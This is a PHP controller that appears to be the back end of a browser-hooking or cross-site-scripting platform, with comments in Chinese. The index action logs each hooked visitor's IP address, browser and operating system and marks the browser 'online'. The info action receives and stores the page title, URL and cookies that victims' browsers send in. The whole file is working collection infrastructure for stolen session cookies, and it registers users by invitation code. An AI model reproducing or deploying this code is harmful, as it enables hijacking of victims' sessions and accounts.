<?php
class  IndexAction  extends  Action{
	
	function   index(){
 
		$uid=$_GET['u'];
		$i=$_GET['i'];

		if($uid){
		

	    $project=new ProjectModel();
	    
	    $pid=$project->url_to_pid($uid);
	    
	    if($pid){
	   
	  
	
		load_lib('Browser');
		$ip=get_client_ip();
		$type=htmlentities(Browser::get_client_browser());
		$os=htmlentities(Browser::get_clinet_os());
		$browser=new  BrowserModel($ip,$type,$os,$pid);
		if($browser->bid){

          if(!$browser->is_active()){

          	 $browser->login();  //登陆  发送消息
          	
          }
                 
			
			
		}else{// 注册
			
			$browser->reg();
			//发送邮件
		 
		}
	   
        if(!$browser->bid)  exit();  // 退出处理
		
        //上线部分完毕
 
        
        include view_file();
	    }else{
	    	
	    	header("Location:?m=xing");
	    	
	    }
        
		}else if($i){  //邀请码注册
			
			
			J("?m=user&a=reg&i=".$i);
			
			
		}else{
			
			header("Location:?m=xing");
			
		}
		
	}
	
	function  info(){
		
		$bid=intval($_POST['bid']);
		extract($_POST,EXTR_SKIP);
		
		if($bid){
			
		$info=new InfoModel($bid);

		$info->set(htmlentities($title),htmlentities($url),htmlentities($cookie));
			
			
		}
		   
		
		
		
		
	}
	
   function  test(){
   	
   	
   	P(APP_PATH);
   	
   	
   }
	
	
	
	
	
	
	
	
}
 